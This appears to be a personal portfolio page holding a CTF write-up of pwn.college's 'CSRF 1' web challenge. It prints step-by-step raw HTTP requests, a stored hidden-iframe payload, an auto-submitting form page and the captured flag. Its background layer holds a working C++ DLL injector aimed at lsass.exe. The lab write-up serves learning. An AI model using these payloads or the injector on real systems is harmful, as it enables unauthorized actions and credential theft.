@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💉 CSRF 1 — Writeup</title>
+    <meta name="description" content="A digital garden for System Exploitation & Reverse Engineering.">
+    
+    <!-- Open Graph Metadata -->
+    <meta property="og:title" content="💉 CSRF 1 — Writeup" />
+    <meta property="og:description" content="System Exploitation and Reverse Engineering Portfolio" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="http://localhost:4000/assets/img/re_background.png" />
+    
+    <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+    <!-- Authentic Code Background Layer (Windows Exploit Context) -->
+    <div id="bg-code-layer" aria-hidden="true">
+#include &lt;windows.h&gt;
+#include &lt;iostream&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Internal structures for PEB and API Hooking
+typedef struct _UNICODE_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PWSTR  Buffer;
+} UNICODE_STRING, *PUNICODE_STRING;
+
+DWORD FindProcessId(const std::wstring& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
+    if (processesSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(processesSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(processesSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(processesSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(processesSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(processesSnapshot);
+    return 0;
+}
+
+int main() {
+    LPCSTR dllPath = "C:\\Payloads\\KAAAMMUUI_Hook.dll";
+    DWORD processId = FindProcessId(L"lsass.exe");
+
+    if (!processId) {
+        std::cerr << "[-] Target process not found." << std::endl;
+        return 1;
+    }
+
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) {
+        std::cerr << "[-] Failed to open process." << std::endl;
+        return 1;
+    }
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, 0);
+
+    HANDLE hLoadThread = CreateRemoteThread(hProcess, 0, 0,
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("Kernel32.dll"), "LoadLibraryA"),
+        pDllPath, 0, 0);
+
+    WaitForSingleObject(hLoadThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, strlen(dllPath) + 1, MEM_RELEASE);
+    CloseHandle(hLoadThread);
+    CloseHandle(hProcess);
+
+    std::cout << "[+] Payload successfully injected into memory space." << std::endl;
+    return 0;
+}
+    </div>
+
+    <div class="glow-orb-1"></div>
+    <div class="glow-orb-2"></div>
+
+    <header>
+        <div class="container">
+            <a href="/" class="site-title">KAAAMMUUI</a>
+            <nav>
+                <a href="/" >Home</a>
+                <a href="/projects/" >Projects</a>
+                <a href="/game-modding/" >Game Modding</a>
+                <a href="/writeups/" class="active">CTF Writeups</a>
+                <a href="/notes/" >Notes</a>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <div class="container page-layout">
+    <article class="post">
+        <header class="post-header">
+            <h1>💉 CSRF 1 — Writeup</h1>
+            
+            <p class="post-meta">Published: April 27, 2026</p>
+            
+            
+            <p style="color: var(--text-muted); margin-top: 5px; font-size: 0.9rem;">Tags: </p>
+            
+        </header>
+
+        <div class="post-content" id="post-content">
+            <h2 id="-challenge-info">📁 Challenge Info</h2>
+
+<ul>
+  <li><strong>Category</strong>: Web Exploitation</li>
+  <li><strong>Challenge</strong>: CSRF 1</li>
+  <li><strong>Platform</strong>: pwn.college</li>
+  <li><strong>Tags</strong>: <code class="language-plaintext highlighter-rouge">CSRF</code>, <code class="language-plaintext highlighter-rouge">Privilege Escalation</code>, <code class="language-plaintext highlighter-rouge">HTML Injection</code>, <code class="language-plaintext highlighter-rouge">Stored XSS (iframe)</code></li>
+</ul>
+
+<hr />
+
+<h2 id="-description">🔍 Description</h2>
+
+<p>This challenge introduces <strong>Cross-Site Request Forgery (CSRF)</strong>, where an attacker forces a victim to unknowingly make an authenticated request. Our goal is to trick the admin bot into <strong>visiting an attacker-controlled page</strong> that automatically publishes the admin’s draft post.</p>
+
+<hr />
+
+<h2 id="-understanding-the-setup">🧠 Understanding the Setup</h2>
+
+<h3 id="app-features">App Features</h3>
+
+<ul>
+  <li><strong>Login</strong> via <code class="language-plaintext highlighter-rouge">/login</code> with session cookie.</li>
+  <li><strong>Draft post</strong> via <code class="language-plaintext highlighter-rouge">/draft</code>, accepts HTML content.</li>
+  <li><strong>Publish</strong> via <code class="language-plaintext highlighter-rouge">/publish</code>, using <strong>GET</strong> requests (CSRF-prone!).</li>
+  <li>Admin bot <strong>visits</strong> the main page and follows embedded links or frames.</li>
+</ul>
+
+<hr />
+
+<h2 id="-attack-strategy">🧪 Attack Strategy</h2>
+
+<ol>
+  <li>Login as <code class="language-plaintext highlighter-rouge">hacker</code></li>
+  <li>Create a post that embeds an <strong>invisible iframe</strong> pointing to our attacker-controlled server</li>
+  <li>Serve a malicious HTML page from <code class="language-plaintext highlighter-rouge">http://hacker.localhost:1337/</code></li>
+  <li>When the bot visits the post, the iframe loads and silently triggers a GET request to <code class="language-plaintext highlighter-rouge">/publish</code></li>
+  <li>This <strong>publishes</strong> the admin’s draft, revealing the flag</li>
+</ol>
+
+<hr />
+
+<h2 id="️-exploit-steps">⚙️ Exploit Steps</h2>
+
+<h3 id="1-log-in-as-hacker">1. Log in as hacker</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s2">"POST /login HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host:challenge.localhost</span><span class="se">\r\n</span><span class="s2">Content-Type:application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s2">Content-Length:29</span><span class="se">\r\n\r\n</span><span class="s2">username=hacker&amp;password=1337"</span> | nc challenge.localhost 80
+</code></pre></div></div>
+
+<p>✅ Grab the session cookie from response:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH4PNQ.asUqMabS4FY7c-cb5B0-MCaI0cg
+</code></pre></div></div>
+
+<hr />
+
+<h3 id="2-craft-malicious-post-with-iframe">2. Craft malicious post with iframe</h3>
+
+<p>Payload:</p>
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;iframe</span> <span class="na">src=</span><span class="s">"http://hacker.localhost:1337/"</span> <span class="na">width=</span><span class="s">"0"</span> <span class="na">height=</span><span class="s">"0"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
+</code></pre></div></div>
+
+<p>URL-encoded as:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>content=%3Ciframe%20src%3D%22http%3A//hacker.localhost%3A1337/%22%20width%3D%220%22%20height%3D%220%22%3E%3C/iframe%3E&amp;publish=on
+</code></pre></div></div>
+
+<p>Submit via <code class="language-plaintext highlighter-rouge">POST /draft</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">PAYLOAD</span><span class="o">=</span><span class="s2">"content=%3Ciframe%20src%3D%22http%3A//hacker.localhost%3A1337/%22%20width%3D%220%22%20height%3D%220%22%3E%3C/iframe%3E&amp;publish=on"</span>
+<span class="nv">LENGTH</span><span class="o">=</span><span class="si">$(</span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"</span><span class="nv">$PAYLOAD</span><span class="s2">"</span> | <span class="nb">wc</span> <span class="nt">-c</span><span class="si">)</span>
+<span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"POST /draft HTTP/1.0</span><span class="se">\r</span><span class="s2">
+Host: challenge.localhost</span><span class="se">\r</span><span class="s2">
+Cookie: session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH4PNQ.asUqMabS4FY7c-cb5B0-MCaI0cg</span><span class="se">\r</span><span class="s2">
+Content-Type: application/x-www-form-urlencoded</span><span class="se">\r</span><span class="s2">
+Content-Length: </span><span class="nv">$LENGTH</span><span class="se">\r</span><span class="s2">
+</span><span class="se">\r</span><span class="s2">
+</span><span class="nv">$PAYLOAD</span><span class="s2">"</span> | nc challenge.localhost 80
+</code></pre></div></div>
+
+<hr />
+
+<h3 id="3-start-malicious-server-attacker-controlled">3. Start malicious server (attacker-controlled)</h3>
+
+<p>Serve <code class="language-plaintext highlighter-rouge">index.html</code> from port <code class="language-plaintext highlighter-rouge">1337</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-m</span> http.server 1337
+</code></pre></div></div>
+
+<p>Contents of <code class="language-plaintext highlighter-rouge">index.html</code>:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html&gt;</span>
+  <span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"document.forms[0].submit()"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"http://challenge.localhost/publish"</span> <span class="na">method=</span><span class="s">"GET"</span><span class="nt">&gt;</span>
+      <span class="c">&lt;!-- Hidden form auto-submits on load --&gt;</span>
+    <span class="nt">&lt;/form&gt;</span>
+  <span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>🧠 This <strong>auto-submits</strong> a GET request to <code class="language-plaintext highlighter-rouge">/publish</code> as soon as the admin loads it inside the iframe.</p>
+
+<hr />
+
+<h3 id="4-trigger-admin-visit">4. Trigger admin visit</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/challenge/victim
+</code></pre></div></div>
+
+<p>✅ Admin visits the page, loads the iframe, and the CSRF triggers <code class="language-plaintext highlighter-rouge">/publish</code>.</p>
+
+<hr />
+
+<h3 id="5-re-login-and-verify-success">5. Re-login and verify success</h3>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">printf</span> <span class="s2">"POST /login HTTP/1.0</span><span class="se">\r\n</span><span class="s2">Host:challenge.localhost</span><span class="se">\r\n</span><span class="s2">Content-Type:application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s2">Content-Length:29</span><span class="se">\r\n\r\n</span><span class="s2">username=hacker&amp;password=1337"</span> | nc challenge.localhost 80
+</code></pre></div></div>
+
+<p>Get new session and then:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-b</span> <span class="s2">"session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.aH4Pvg.z85iGtC4AhGvJkGX8LOz1wPo-5Y"</span> http://challenge.localhost/
+</code></pre></div></div>
+
+<p>✅ Page shows:</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;h2&gt;</span>Author: admin<span class="nt">&lt;/h2&gt;</span>pwn.college{kVpaE06oj3LD0PEN5AVXrNX9jhd.QX3kzMzwSM0IzMyEzW}
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-flag">🏁 Flag</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwn.college{kVpaE06oj3LD0PEN5AVXrNX9jhd.QX3kzMzwSM0IzMyEzW}
+</code></pre></div></div>
+
+<hr />
+
+<h2 id="-summary">✅ Summary</h2>
+
+<p>This challenge demonstrates classic <strong>GET-based CSRF</strong>, where:</p>
+
+<ul>
+  <li>Attacker-controlled content embeds an iframe</li>
+  <li>Victim browser loads it</li>
+  <li>A state-changing GET request fires in the background</li>
+</ul>
+
+<p>🔓 Because the victim is logged in and no CSRF token is required — the action succeeds.</p>
+
+<hr />
+
+
+        </div>
+    </article>
+    
+    <aside class="toc-container">
+        <div class="toc-sidebar" id="toc-sidebar">
+            <h3>On this page</h3>
+            <ul id="toc-list"></ul>
+        </div>
+    </aside>
+</div>
+
+    </main>
+
+    <footer>
+        <div class="container">
+            <div class="footer-socials" style="margin-bottom: 1rem; display: flex; justify-content: center; gap: 1.5rem;">
+                <a href="https://github.com/HimanshuP601" target="_blank">GitHub</a>
+                <a href="https://www.linkedin.com/in/himanshuparate/" target="_blank">LinkedIn</a>
+                <a href="https://medium.com/@HimanshuP601" target="_blank">Medium</a>
+                <a href="https://pwn.college/hacker/HimanshuP601" target="_blank">pwn.college</a>
+                <a href="mailto:himanshuparate601@gmail.com">Email</a>
+                <span style="color: var(--text-muted);">Discord: himasnhu</span>
+            </div>
+            
+            <div style="margin-bottom: 2rem; display: flex; justify-content: center;">
+                <a href="https://app.hackthebox.com/users/2410266" target="_blank">
+                    <img src="https://www.hackthebox.eu/badge/image/2410266" alt="Hack The Box Badge">
+                </a>
+            </div>
+
+            <p>&copy; 2026 Himanshu. Hosted natively on GitHub Pages.</p>
+        </div>
+    </footer>
+    <script src="/assets/js/main.js"></script>
+</body>
+</html>
